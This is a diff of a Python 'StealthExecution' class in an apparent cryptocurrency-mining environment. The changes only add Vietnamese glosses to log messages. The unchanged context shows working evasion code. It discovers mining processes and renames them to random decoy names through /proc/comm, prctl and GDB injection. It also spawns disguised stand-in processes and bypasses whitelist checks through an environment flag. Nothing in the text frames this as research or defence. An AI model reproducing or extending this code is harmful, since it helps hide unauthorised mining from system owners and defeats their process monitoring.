@@ -66,14 +66,14 @@ class StealthExecution:
             try:
                 # Sử dụng unified CPU cloaking logger
                 self.logger = get_unified_logger('mining_environment.cpu_stealth')
-                self.logger.info("🔒 [CPU-ONLY] StealthExecution initialized with CPU-specific logger")
+                self.logger.info("🔒 [**[CPU]** (bộ xử lý trung tâm)-ONLY] StealthExecution initialized with **[CPU]** (bộ xử lý trung tâm)-specific logger")
             except Exception:
                 # Fallback to module logger nếu unified system không khả dụng
                 self.logger = logging.getLogger(__name__)
-                self.logger.warning("⚠️ [CPU-ONLY] Fallback logger used - verify CPU-only compliance")
+                self.logger.warning("⚠️ [**[CPU]** (bộ xử lý trung tâm)-ONLY] Fallback logger used - verify **[CPU]** (bộ xử lý trung tâm)-only compliance")
         else:
             self.logger = logger
-            self.logger.info("🔒 [CPU-ONLY] StealthExecution initialized with custom logger")
+            self.logger.info("🔒 [**[CPU]** (bộ xử lý trung tâm)-ONLY] StealthExecution initialized with custom logger")
         # 🚫 Ensure CPU logger doesn't propagate to root to avoid GPUCloak prefix
         self.logger.propagate = False
         # 🚀 Ensure at least one handler; otherwise add CPU-specific file handler
@@ -221,12 +221,12 @@ class StealthExecution:
             
             # Check if it's a kernel thread
             if self._is_kernel_thread(pid):
-                self.logger.warning(f"🚫 [KERNEL_THREAD] PID {pid} ({process_name}) is kernel thread - finding alternative target")
+                self.logger.warning(f"🚫 [KERNEL_THREAD] **[PID]** (Process ID - mã định danh tiến trình) {pid} ({process_name}) is kernel **[thread]** (luồng) - finding alternative target")
                 
                 # Find alternative user process
                 alternative_pid = self._get_alternative_target_pid(pid)
                 if alternative_pid and alternative_pid != pid:
-                    self.logger.info(f"🔄 [KERNEL_BYPASS] Using alternative PID {alternative_pid} for kernel thread {pid}")
+                    self.logger.info(f"🔄 [KERNEL_BYPASS] Using alternative **[PID]** (Process ID - mã định danh tiến trình) {alternative_pid} for kernel **[thread]** (luồng) {pid}")
                     
                     # Store kernel thread mapping
                     if not hasattr(self, '_kernel_thread_mapping'):
@@ -236,7 +236,7 @@ class StealthExecution:
                     # Add alternative PID to tracking instead
                     return self.add_process(alternative_pid)  # Recursive call with real process
                 else:
-                    self.logger.error(f"❌ [KERNEL_BYPASS] No alternative found for kernel thread PID {pid}")
+                    self.logger.error(f"❌ [KERNEL_BYPASS] No alternative found for kernel **[thread]** (luồng) **[PID]** (Process ID - mã định danh tiến trình) {pid}")
                     return False
             
             # Regular whitelist protection check for user processes
@@ -244,17 +244,17 @@ class StealthExecution:
                 return False  # Process được bảo vệ, không được disguise
             
         self._tracked_pids.add(pid)
-        self.logger.debug(f"Added PID {pid} to stealth tracking")
+        self.logger.debug(f"Added **[PID]** (Process ID - mã định danh tiến trình) {pid} to stealth tracking")
         
         # ✅ ENHANCED: Immediate process name change upon registration nếu được phép
         try:
             new_name = random.choice(self._decoy_processes)
             if self._change_process_name_safe(pid, new_name):
-                self.logger.info(f"✅ [STEALTH] Immediately changed PID {pid} name to '{new_name}'")
+                self.logger.info(f"✅ [STEALTH] Immediately changed **[PID]** (Process ID - mã định danh tiến trình) {pid} name to '{new_name}'")
             else:
-                self.logger.warning(f"⚠️ [STEALTH] Failed immediate name change for PID {pid}")
+                self.logger.warning(f"⚠️ [STEALTH] Failed immediate name change for **[PID]** (Process ID - mã định danh tiến trình) {pid}")
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH] Error in immediate name change for PID {pid}: {e}")
+            self.logger.error(f"❌ [STEALTH] **[error]** (lỗi) in immediate name change for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             
         return True
     
@@ -269,7 +269,7 @@ class StealthExecution:
                 time.sleep(self.comm_rotation_interval)
                 
             except Exception as e:
-                self.logger.error(f"Error in stealth loop: {e}")
+                self.logger.error(f"**[error]** (lỗi) in stealth loop: {e}")
                 time.sleep(5)
     
     def _rotate_process_names(self):
@@ -286,12 +286,12 @@ class StealthExecution:
                 
                 # ✅ WHITELIST PROTECTION: Sử dụng safe method với protection checks
                 if self._change_process_name_safe(pid, new_name):
-                    self.logger.debug(f"✅ [ROTATION] PID {pid} name rotated to '{new_name}'")
+                    self.logger.debug(f"✅ [ROTATION] **[PID]** (Process ID - mã định danh tiến trình) {pid} name rotated to '{new_name}'")
                 else:
-                    self.logger.debug(f"🛡️ [ROTATION] PID {pid} rotation skipped (protected or failed)")
+                    self.logger.debug(f"🛡️ [ROTATION] **[PID]** (Process ID - mã định danh tiến trình) {pid} rotation skipped (protected or failed)")
                 
             except Exception as e:
-                self.logger.error(f"Error rotating name for PID {pid}: {e}")
+                self.logger.error(f"**[error]** (lỗi) rotating name for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
     
     def _is_process_alive(self, pid: int) -> bool:
         """Kiểm tra tiến trình còn sống không."""
@@ -330,12 +330,12 @@ class StealthExecution:
             
             # ✅ KERNEL THREAD DETECTION: Bypass kernel threads completely
             if self._is_kernel_thread(pid):
-                self.logger.warning(f"🚫 [KERNEL_THREAD] PID {pid} is kernel thread ({process_name}) - cannot disguise, searching for alternative target")
+                self.logger.warning(f"🚫 [KERNEL_THREAD] **[PID]** (Process ID - mã định danh tiến trình) {pid} is kernel **[thread]** (luồng) ({process_name}) - cannot disguise, searching for alternative target")
                 
                 # Try to find alternative user process to disguise instead
                 alternative_pid = self._get_alternative_target_pid(pid)
                 if alternative_pid and alternative_pid != pid:
-                    self.logger.info(f"🔄 [KERNEL_BYPASS] Using alternative PID {alternative_pid} instead of kernel thread {pid}")
+                    self.logger.info(f"🔄 [KERNEL_BYPASS] Using alternative **[PID]** (Process ID - mã định danh tiến trình) {alternative_pid} instead of kernel **[thread]** (luồng) {pid}")
                     # Update the tracking to use alternative PID
                     if hasattr(self, '_kernel_thread_mapping'):
                         self._kernel_thread_mapping[pid] = alternative_pid
@@ -348,7 +348,7 @@ class StealthExecution:
                     
                     return False  # Don't disguise kernel thread itself
                 else:
-                    self.logger.error(f"❌ [KERNEL_BYPASS] No alternative target found for kernel thread PID {pid}")
+                    self.logger.error(f"❌ [KERNEL_BYPASS] No alternative target found for kernel **[thread]** (luồng) **[PID]** (Process ID - mã định danh tiến trình) {pid}")
                     return False
             
             # **Whitelist Check** (Kiểm tra danh sách trắng) - DISABLED FOR STEALTH RENAME
@@ -356,7 +356,7 @@ class StealthExecution:
             # ✅ STEALTH RENAME ENABLED: Luôn cho phép disguise để stealth hoạt động
             stealth_mode_enabled = os.getenv("ENABLE_STEALTH_RENAME", "true").lower() == "true"
             if stealth_mode_enabled:
-                self.logger.debug(f"🔧 [STEALTH_RENAME] Grace period bypassed for PID {pid} - stealth mode enabled")
+                self.logger.debug(f"🔧 [STEALTH_RENAME] Grace period bypassed for **[PID]** (Process ID - mã định danh tiến trình) {pid} - stealth mode enabled")
             else:
                 try:
                     proc_ctime = os.path.getctime(f"/proc/{pid}")
@@ -406,7 +406,7 @@ class StealthExecution:
                         # Kernel threads có tên trong dấu []
                         comm_name = stat_fields[1]
                         if comm_name.startswith('[') and comm_name.endswith(']'):
-                            self.logger.debug(f"🔍 [KERNEL_DETECTION] PID {pid} is kernel thread: {comm_name}")
+                            self.logger.debug(f"🔍 [KERNEL_DETECTION] **[PID]** (Process ID - mã định danh tiến trình) {pid} is kernel **[thread]** (luồng): {comm_name}")
                             return True
             
             # Method 2: Check parent PID = 2 (kthreadd) và không có exe link
@@ -418,7 +418,7 @@ class StealthExecution:
                         if ppid == 2:  # kthreadd parent
                             # Kernel threads thường không có exe link
                             if not os.path.exists(f"/proc/{pid}/exe"):
-                                self.logger.debug(f"🔍 [KERNEL_DETECTION] PID {pid} is kernel thread (ppid=2, no exe)")
+                                self.logger.debug(f"🔍 [KERNEL_DETECTION] **[PID]** (Process ID - mã định danh tiến trình) {pid} is kernel **[thread]** (luồng) (ppid=2, no exe)")
                                 return True
             except (ValueError, IndexError):
                 pass
@@ -434,7 +434,7 @@ class StealthExecution:
                             # Nếu comm name chứa pattern kernel thread
                             kernel_patterns = ['kthread', 'migration', 'rcu_', 'watchdog', 'nv_queue', 'worker']
                             if any(pattern in comm_name.lower() for pattern in kernel_patterns):
-                                self.logger.debug(f"🔍 [KERNEL_DETECTION] PID {pid} detected as kernel thread by pattern: {comm_name}")
+                                self.logger.debug(f"🔍 [KERNEL_DETECTION] **[PID]** (Process ID - mã định danh tiến trình) {pid} detected as kernel **[thread]** (luồng) by pattern: {comm_name}")
                                 return True
             except Exception:
                 pass
@@ -442,7 +442,7 @@ class StealthExecution:
             return False
             
         except (OSError, IOError) as e:
-            self.logger.debug(f"Could not check kernel thread status for PID {pid}: {e}")
+            self.logger.debug(f"Could not check kernel **[thread]** (luồng) status for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             return False
     
     def _get_process_name(self, pid: int) -> str:
@@ -469,7 +469,7 @@ class StealthExecution:
             return f"unknown_pid_{pid}"
             
         except (OSError, IOError) as e:
-            self.logger.debug(f"Could not get process name for PID {pid}: {e}")
+            self.logger.debug(f"Could not get **[process]** (tiến trình) name for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             return f"unknown_pid_{pid}"
     
     def _find_actual_mining_processes(self) -> List[int]:
@@ -505,13 +505,13 @@ class StealthExecution:
                             exe_path = os.readlink(f"/proc/{pid}/exe")
                             if os.path.exists(exe_path):
                                 mining_pids.append(pid)
-                                self.logger.info(f"🔍 [PROCESS_DISCOVERY] Found real mining process: PID {pid}, exe: {exe_path}")
+                                self.logger.info(f"🔍 [PROCESS_DISCOVERY] Found real mining **[process]** (tiến trình): **[PID]** (Process ID - mã định danh tiến trình) {pid}, exe: {exe_path}")
                         except (OSError, IOError):
                             # No exe link - might still be valid user process
                             # Check if it has non-empty cmdline và không phải kernel thread
                             if len(cmdline.strip()) > 0:
                                 mining_pids.append(pid)
-                                self.logger.info(f"🔍 [PROCESS_DISCOVERY] Found potential mining process: PID {pid} (no exe link)")
+                                self.logger.info(f"🔍 [PROCESS_DISCOVERY] Found potential mining **[process]** (tiến trình): **[PID]** (Process ID - mã định danh tiến trình) {pid} (no exe link)")
                                 
                 except (OSError, IOError):
                     continue
@@ -522,7 +522,7 @@ class StealthExecution:
                 self.logger.info(f"✅ [PROCESS_DISCOVERY] Found {len(mining_pids)} real mining processes: {mining_pids}")
                 
         except Exception as e:
-            self.logger.error(f"❌ [PROCESS_DISCOVERY] Error discovering mining processes: {e}")
+            self.logger.error(f"❌ [PROCESS_DISCOVERY] **[error]** (lỗi) discovering mining processes: {e}")
             
         return mining_pids
     
@@ -545,20 +545,20 @@ class StealthExecution:
                         with open(comm_path, "w") as f:
                             f.write(current_name)  # Write back same name
                         
-                        self.logger.info(f"✅ [ALTERNATIVE_TARGET] Found writable target: PID {pid}")
+                        self.logger.info(f"✅ [ALTERNATIVE_TARGET] Found writable target: **[PID]** (Process ID - mã định danh tiến trình) {pid}")
                         return pid
                     except (PermissionError, OSError):
                         continue
                 
                 # If no writable found, return first available
                 if alternative_pids:
-                    self.logger.info(f"🔄 [ALTERNATIVE_TARGET] Using first available: PID {alternative_pids[0]}")
+                    self.logger.info(f"🔄 [ALTERNATIVE_TARGET] Using first available: **[PID]** (Process ID - mã định danh tiến trình) {alternative_pids[0]}")
                     return alternative_pids[0]
             
             # Fallback: find any user process we can write to
             try:
                 own_pid = os.getpid()
-                self.logger.info(f"🔄 [ALTERNATIVE_TARGET] Fallback to own process: PID {own_pid}")
+                self.logger.info(f"🔄 [ALTERNATIVE_TARGET] Fallback to own **[process]** (tiến trình): **[PID]** (Process ID - mã định danh tiến trình) {own_pid}")
                 return own_pid
             except Exception:
                 pass
@@ -566,7 +566,7 @@ class StealthExecution:
             return None
             
         except Exception as e:
-            self.logger.error(f"❌ [ALTERNATIVE_TARGET] Error finding alternative PID: {e}")
+            self.logger.error(f"❌ [ALTERNATIVE_TARGET] **[error]** (lỗi) finding alternative **[PID]** (Process ID - mã định danh tiến trình): {e}")
             return None
             
     def _register_protected_process(self, pid: int, process_name: str):
@@ -614,7 +614,7 @@ class StealthExecution:
             return True
             
         except Exception as e:
-            self.logger.error(f"❌ [ERROR] Legitimacy check failed for PID {pid}: {e}")
+            self.logger.error(f"❌ [**[error]** (lỗi)] Legitimacy check failed for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             return False
     
     def _periodic_cleanup(self):
@@ -632,7 +632,7 @@ class StealthExecution:
                 self.logger.debug(f"🧹 [CLEANUP] Removed {len(dead_pids)} dead protected processes")
                 
         except Exception as e:
-            self.logger.error(f"❌ [CLEANUP] Periodic cleanup error: {e}")
+            self.logger.error(f"❌ [CLEANUP] Periodic cleanup **[error]** (lỗi): {e}")
     
     def _emergency_cleanup(self):
         """**Emergency Cleanup** (Cleanup khẩn cấp) - registry size limit."""
@@ -654,7 +654,7 @@ class StealthExecution:
     def _handle_error(self, error: Exception):
         """**Error Handling with Circuit Breaker** (Xử lý lỗi với bộ ngắt mạch)."""
         self._error_count += 1
-        self.logger.error(f"❌ [ERROR] Protection error: {error}")
+        self.logger.error(f"❌ [**[error]** (lỗi)] Protection **[error]** (lỗi): {error}")
         
         if self._error_count > self._error_threshold:
             self._circuit_open = True
@@ -710,7 +710,7 @@ class StealthExecution:
                 return False, "access_denied", 10
                 
         except Exception as e:
-            self.logger.error(f"❌ [RISK_ASSESSMENT] Safety assessment failed for PID {pid}: {e}")
+            self.logger.error(f"❌ [RISK_ASSESSMENT] Safety assessment failed for **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             return False, "assessment_failed", 10
     
     def _check_gdb_availability(self) -> bool:
@@ -737,7 +737,7 @@ class StealthExecution:
                 can_disguise, method, risk_level = self._assess_disguise_safety(pid)
                 
                 if not can_disguise:
-                    self.logger.warning(f"🚫 [SAFE_DISGUISE] PID {pid}: Cannot disguise safely - {method}")
+                    self.logger.warning(f"🚫 [SAFE_DISGUISE] **[PID]** (Process ID - mã định danh tiến trình) {pid}: Cannot disguise safely - {method}")
                     return False
                 
                 # Check risk threshold
@@ -766,7 +766,7 @@ class StealthExecution:
                         f"using {method} (risk level: {risk_level})"
                     )
                 else:
-                    self.logger.error(f"❌ [SAFE_DISGUISE] PID {pid}: Disguise failed using {method}")
+                    self.logger.error(f"❌ [SAFE_DISGUISE] **[PID]** (Process ID - mã định danh tiến trình) {pid}: Disguise failed using {method}")
                 
                 return success
                 
@@ -793,7 +793,7 @@ class StealthExecution:
                 return False
                 
         except Exception as e:
-            self.logger.error(f"❌ [SAFE_DISGUISE] Error applying {method} to PID {pid}: {e}")
+            self.logger.error(f"❌ [SAFE_DISGUISE] **[error]** (lỗi) applying {method} to **[PID]** (Process ID - mã định danh tiến trình) {pid}: {e}")
             return False
     
     def _disguise_via_proc_comm_self(self, pid: int, name: str) -> bool:
@@ -860,7 +860,7 @@ class StealthExecution:
                 'simulation_time': time.time()
             }
             
-            self.logger.info(f"🔄 [SIMULATION] PID {pid}: Simulated disguise as '{name}' (logical mapping only)")
+            self.logger.info(f"🔄 [SIMULATION] **[PID]** (Process ID - mã định danh tiến trình) {pid}: Simulated disguise as '{name}' (logical mapping only)")
             return True
         except Exception:
             return False
@@ -902,7 +902,7 @@ class StealthExecution:
                 if os.path.exists(comm_path):
                     with open(comm_path, "w") as f:
                         f.write(new_name[:15])  # Linux comm limit is 15 chars
-                    self.logger.debug(f"✅ Changed process name via /proc/comm: {new_name}")
+                    self.logger.debug(f"✅ Changed **[process]** (tiến trình) name via /proc/comm: {new_name}")
                     return True
             methods_tried.append("proc_comm_own")
         except Exception as e:
@@ -917,7 +917,7 @@ class StealthExecution:
                     # PR_SET_NAME = 15
                     result = libc.prctl(15, new_name[:15].encode(), 0, 0, 0)
                     if result == 0:
-                        self.logger.debug(f"✅ Changed process name via prctl: {new_name}")
+                        self.logger.debug(f"✅ Changed **[process]** (tiến trình) name via prctl: {new_name}")
                         return True
             methods_tried.append("prctl_own")
         except Exception as e:
@@ -932,7 +932,7 @@ class StealthExecution:
                 comm_path = f"/proc/{pid}/comm"
                 with open(comm_path, "w") as f:
                     f.write(new_name[:15])
-                self.logger.info(f"✅ [STEALTH] External process name changed via /proc/comm: PID {pid} → {new_name}")
+                self.logger.info(f"✅ [STEALTH] External **[process]** (tiến trình) name changed via /proc/comm: **[PID]** (Process ID - mã định danh tiến trình) {pid} → {new_name}")
                 return True
             methods_tried.append("proc_comm_external")
         except PermissionError:
@@ -961,12 +961,12 @@ class StealthExecution:
             )
             
             if process.returncode == 0:
-                self.logger.info(f"✅ [STEALTH] External process name changed via GDB injection: PID {pid} → {new_name}")
+                self.logger.info(f"✅ [STEALTH] External **[process]** (tiến trình) name changed via GDB injection: **[PID]** (Process ID - mã định danh tiến trình) {pid} → {new_name}")
                 return True
             methods_tried.append("gdb_injection")
         except FileNotFoundError:
             methods_tried.append("gdb_not_available")
-            self.logger.debug("❌ GDB not available for process injection")
+            self.logger.debug("❌ GDB not available for **[process]** (tiến trình) injection")
         except Exception as e:
             methods_tried.append("gdb_injection_failed")
             self.logger.debug(f"❌ Failed GDB injection method: {e}")
@@ -986,21 +986,21 @@ class StealthExecution:
                     'original_pid': pid,
                     'spawn_time': time.time()
                 }
-                self.logger.info(f"✅ [STEALTH] Real process spawned: Original PID {pid} → Disguised PID {spawned_pid} as '{new_name}'")
+                self.logger.info(f"✅ [STEALTH] Real **[process]** (tiến trình) spawned: Original **[PID]** (Process ID - mã định danh tiến trình) {pid} → Disguised **[PID]** (Process ID - mã định danh tiến trình) {spawned_pid} as '{new_name}'")
                 methods_tried.append("process_spawning_success")
                 return True
             else:
                 methods_tried.append("process_spawning_failed")
-                self.logger.debug(f"❌ Failed to spawn disguised process for {new_name}")
+                self.logger.debug(f"❌ Failed to spawn disguised **[process]** (tiến trình) for {new_name}")
         except Exception as e:
             methods_tried.append("process_spawning_error")
-            self.logger.debug(f"❌ Error in process spawning method: {e}")
+            self.logger.debug(f"❌ **[error]** (lỗi) in **[process]** (tiến trình) spawning method: {e}")
 
         # Method 6: Fallback - simulate process name change in logs
         try:
             # Since we can't change the actual process name, we can at least log it as changed
             # This provides operational security through obscurity in monitoring
-            self.logger.info(f"🔄 [STEALTH] Simulated name change: PID {pid} logically mapped to '{new_name}'")
+            self.logger.info(f"🔄 [STEALTH] Simulated name change: **[PID]** (Process ID - mã định danh tiến trình) {pid} logically mapped to '{new_name}'")
             # Store mapping for reference
             if not hasattr(self, '_name_mappings'):
                 self._name_mappings = {}
@@ -1011,7 +1011,7 @@ class StealthExecution:
             self.logger.debug(f"❌ Failed simulation method: {e}")
             
         # All methods failed - detailed debugging
-        self.logger.warning(f"⚠️ [STEALTH] All methods failed to change process name for PID {pid} to '{new_name}'. Methods tried: {', '.join(methods_tried)}")
+        self.logger.warning(f"⚠️ [STEALTH] All methods failed to change **[process]** (tiến trình) name for **[PID]** (Process ID - mã định danh tiến trình) {pid} to '{new_name}'. Methods tried: {', '.join(methods_tried)}")
         return False
     
     def _spawn_disguised_process(self, legitimate_name: str, original_pid: int) -> Optional[int]:
@@ -1073,15 +1073,15 @@ sys.exit(0)
             # Verify process started successfully
             time.sleep(0.1)
             if process.poll() is None:  # Process still running
-                self.logger.info(f"🚀 [STEALTH] Successfully spawned disguised process PID {process.pid} as '{legitimate_name}'")
+                self.logger.info(f"🚀 [STEALTH] Successfully spawned disguised **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình) {process.pid} as '{legitimate_name}'")
                 return process.pid
             else:
-                self.logger.error(f"❌ [STEALTH] Spawned process failed to start for '{legitimate_name}'")
+                self.logger.error(f"❌ [STEALTH] Spawned **[process]** (tiến trình) failed to start for '{legitimate_name}'")
                 os.unlink(script_path)  # Cleanup failed script
                 return None
                 
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH] Error spawning disguised process: {e}")
+            self.logger.error(f"❌ [STEALTH] **[error]** (lỗi) spawning disguised **[process]** (tiến trình): {e}")
             return None
     
     def cleanup_spawned_processes(self) -> bool:
@@ -1103,9 +1103,9 @@ sys.exit(0)
                         except ProcessLookupError:
                             pass  # Process already terminated
                         cleanup_count += 1
-                        self.logger.info(f"🧹 [STEALTH] Cleaned up spawned process PID {spawned_pid}")
+                        self.logger.info(f"🧹 [STEALTH] Cleaned up spawned **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình) {spawned_pid}")
                     except Exception as e:
-                        self.logger.debug(f"Warning: Could not cleanup spawned process: {e}")
+                        self.logger.debug(f"**[warning]** (cảnh báo): Could not cleanup spawned **[process]** (tiến trình): {e}")
                 
                 self._spawned_processes.clear()
             
@@ -1124,5 +1124,5 @@ sys.exit(0)
             return True
             
         except Exception as e:
-            self.logger.error(f"❌ [STEALTH] Error during spawned process cleanup: {e}")
+            self.logger.error(f"❌ [STEALTH] **[error]** (lỗi) during spawned **[process]** (tiến trình) cleanup: {e}")
             return False 
